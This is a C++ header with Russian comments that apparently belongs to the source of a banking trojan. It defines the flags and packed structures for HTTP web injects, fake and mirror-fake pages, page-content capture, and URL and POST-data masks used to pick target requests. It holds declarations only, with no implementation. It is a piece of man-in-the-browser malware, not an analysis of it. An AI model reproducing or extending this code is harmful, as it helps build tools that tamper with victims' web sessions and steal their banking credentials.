/*
  Некотрые данне для HTTP-инжектов и HTTP-фейков.
*/
#pragma once

namespace HttpInject
{
  //Флаги HEADER.flags.
  enum
  {
    FLAG_IS_FAKE                  = 0x0001, //Структура является фейком.
    FLAG_IS_MIRRORFAKE            = 0x0002, //Структура является заеркалом-фейком.
    FLAG_IS_INJECT                = 0x0004, //Структура является инжектом.
    FLAG_IS_CAPTURE               = 0x0008, //Структура является заватом контекста.

    FLAG_ONCE_PER_DAY             = 0x0010, //Запускать структуру раз в 24-часа.
    FLAG_REQUEST_POST             = 0x0020, //Запсукать структура на POST-запрос.
    FLAG_REQUEST_GET              = 0x0040, //Запсукать структура на GET-запрос.

    FLAG_CAPTURE_NOTPARSE         = 0x0100, //Не удалять HTML-тэги из заваченого контента.
    FLAG_CAPTURE_TOFILE           = 0x0200, //Записывать результат завата контента в файл, а не отчет.
    
    FLAG_URL_CASE_INSENSITIVE     = 0x1000, //Сравнивать URL без учета регистра (только англ. символы).
    FLAG_CONTEXT_CASE_INSENSITIVE = 0x2000  //Сравнивать содержимое без учтеа регистра.
  };

# pragma pack(push, 1)
  typedef struct
  {
    WORD flags;             //Флаги FLAG_*.
    WORD size;              //Полный размер стрктуры.
    WORD urlMask;           //Позиция маски URL.
    WORD fakeUrl;           //Позиция фейковой URL.
    WORD postDataBlackMask; //Позиция блек-маски POST-данных.
    WORD postDataWhiteMask; //Позиция вайт-маски POST-данных.
    WORD blockOnUrl;        //Позиция URL, при заходе на которую эта структура будет заблокирована.
    WORD contextMask;       //Позиция маски котекста.
  }HEADER;

  //Заголовок содержимого для инжекта.
  typedef struct
  {
    WORD size;    //Размер данных влючая размер этой структуры.
    WORD flags;   //Флаги.
  }INJECTBLOCK;
# pragma pack(pop)

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Проверка корректности оффсетов в HEADER.

    IN header - HEADER.

    Return    - true - корректно,
                false - не корректно.
  */
  bool _isCorrectHeader(const HEADER *header);

  /*
    Проверка корректности набора INJECTBLOCK.

    IN block - набор INJECTBLOCK.
    IN size  - размер набора.

    Return    - true - корректно,
                false - не корректно.
  */
  bool _isCorrectBlockList(const INJECTBLOCK *block, DWORD size);
};
